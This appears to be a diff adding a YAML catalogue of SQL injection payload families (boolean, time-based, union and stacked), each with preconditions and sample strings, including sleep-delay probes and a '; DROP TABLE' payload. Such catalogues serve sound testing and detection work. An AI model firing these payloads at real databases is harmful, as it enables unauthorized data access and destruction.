@@ -1,0 +1,25 @@
+families:
+  - id: sqli-boolean-based
+    category: boolean-based
+    tags: [boolean-based]
+    preconditions: { error_handling: generic }
+    examples: ["' OR '1'='1'--", "' OR '1'='2'--"]
+    why_it_works: truthiness
+  - id: sqli-time-based
+    category: time-based
+    tags: [time-based]
+    preconditions: { db_supports_sleep: true }
+    examples: ["'; SELECT pg_sleep(5)--", "'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--"]
+    why_it_works: delay-based inference
+  - id: sqli-union-based
+    category: union-based
+    tags: [union-based]
+    preconditions: { column_count_known: true }
+    examples: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"]
+    why_it_works: UNION exfil
+  - id: sqli-stacked-queries
+    category: stacked
+    tags: [stacked]
+    preconditions: { driver_allows_multi: true }
+    examples: ["'; DROP TABLE test--"]
+    why_it_works: multiple statements
